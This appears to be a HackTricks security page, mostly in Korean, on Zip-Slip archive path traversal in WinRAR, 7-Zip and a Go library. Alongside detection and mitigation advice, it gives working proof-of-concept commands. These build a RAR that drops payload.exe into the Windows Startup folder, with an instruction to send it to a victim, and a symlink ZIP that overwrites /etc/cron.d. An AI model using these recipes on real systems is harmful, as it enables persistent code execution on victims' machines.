# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 개요

많은 아카이브 형식(ZIP, RAR, TAR, 7-ZIP 등)은 각 항목이 자체 **내부 경로**를 가질 수 있습니다. 추출 유틸리티가 그 경로를 무비판적으로 신뢰하면, `..`을 포함하거나 **절대 경로**(예: `C:\Windows\System32\`)인 조작된 파일명이 사용자가 선택한 디렉터리 밖에 쓰여질 수 있습니다.  
이 취약성 계열은 널리 *Zip-Slip* 또는 **archive extraction path traversal**로 알려져 있습니다.

결과는 임의의 파일 덮어쓰기부터 Windows *Startup* 폴더와 같은 **자동 실행** 위치에 페이로드를 배치하여 직접 **remote code execution (RCE)**을 달성하는 것까지 다양합니다.

## 근본 원인

1. 공격자는 하나 이상의 파일 헤더에 다음을 포함하도록 아카이브를 만듭니다:
* 상대 경로 탐색 시퀀스 (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* 절대 경로 (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* 또는 대상 디렉터리 밖으로 해석되는 조작된 **symlinks**(주로 *nix*의 ZIP/TAR에서 흔함).
2. 피해자는 임베디드 경로를 정화하거나 선택한 디렉터리 아래로 강제 추출하지 않고 해당 경로를 신뢰(또는 symlinks를 따라감)하는 취약한 도구로 아카이브를 추출합니다.
3. 파일이 공격자가 제어하는 위치에 기록되고 시스템이나 사용자가 해당 경로를 트리거할 때 실행/로드됩니다.

## 실제 사례 – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows용 WinRAR( `rar` / `unrar` CLI, DLL 및 포터블 소스 포함)는 추출 중 파일명을 검증하지 못했습니다.  
다음과 같은 항목을 포함한 악성 RAR 아카이브:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
선택한 출력 디렉터리의 **밖**에 위치하게 되어 사용자의 *Startup* 폴더 안으로 들어갑니다. 로그온 후 Windows는 그곳에 있는 모든 항목을 자동으로 실행하여 *persistent* RCE를 제공합니다.

### PoC 아카이브 제작 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
사용된 옵션:
* `-ep`  – 파일 경로를 주어진 대로 정확히 저장 (선행 `./`를 **제거하지 마세요**).

`evil.rar`을 피해자에게 전달하고 취약한 WinRAR 빌드로 압축 해제하도록 지시하세요.

### 실제로 관찰된 악용 사례

ESET는 RomCom (Storm-0978/UNC2596)의 spear-phishing 캠페인이 CVE-2025-8088을 악용한 RAR 아카이브를 첨부하여 customised backdoors를 배포하고 ransomware 작전을 용이하게 했다고 보고했습니다.

## 최신 사례 (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
패치된 빌드에서는 `/etc/cron.d`가 손상되지 않으며, symlink는 /tmp/target 내부에 링크로 추출됩니다.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## 탐지 팁

* **Static inspection** – 아카이브 항목을 나열하고 이름에 `../`, `..\\`, *절대 경로* (`/`, `C:`)가 포함되어 있는지 또는 추출 디렉토리 밖을 가리키는 *symlink* 타입 항목이 있는지 플래그합니다.
* **Canonicalisation** – `realpath(join(dest, name))`가 여전히 `dest`로 시작하는지 확인하세요. 그렇지 않으면 거부합니다.
* **Sandbox extraction** – 일회성 디렉토리로 안전한 추출기(예: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00)를 사용해 압축을 풀고 결과 경로가 디렉토리 내부에 머무르는지 검증하세요.
* **Endpoint monitoring** – WinRAR/7-Zip/etc.으로 아카이브를 연 직후 `Startup`/`Run`/`cron` 위치에 새 실행 파일이 쓰이는 경우 경보를 발생시킵니다.

## 완화 및 강화

1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+는 경로/심볼릭 링크 정화를 구현합니다. 두 도구 모두 자동 업데이트는 제공하지 않습니다.
2. 가능한 경우 아카이브를 “**Do not extract paths**” / “**Ignore paths**” 옵션으로 추출하세요.
3. Unix에서는 추출 전에 권한을 낮추고 **chroot/namespace**를 마운트하세요; Windows에서는 **AppContainer**나 샌드박스를 사용하세요.
4. 커스텀 코드를 작성하는 경우, 생성/쓰기 전에 `realpath()`/`PathCanonicalize()`로 정규화하고 대상 경로를 벗어나는 항목은 거부하세요.

## 추가 영향/역사적 사례

* 2018 – Snyk의 대규모 *Zip-Slip* 권고로 많은 Java/Go/JS 라이브러리가 영향받음.
* 2023 – 7-Zip CVE-2023-4011, `-ao` 병합 중 유사한 traversal.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) slugs 내 TAR 추출 traversal (v1.2에서 패치).
* 쓰기 전에 `PathCanonicalize` / `realpath`를 호출하지 않는 모든 커스텀 추출 로직.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
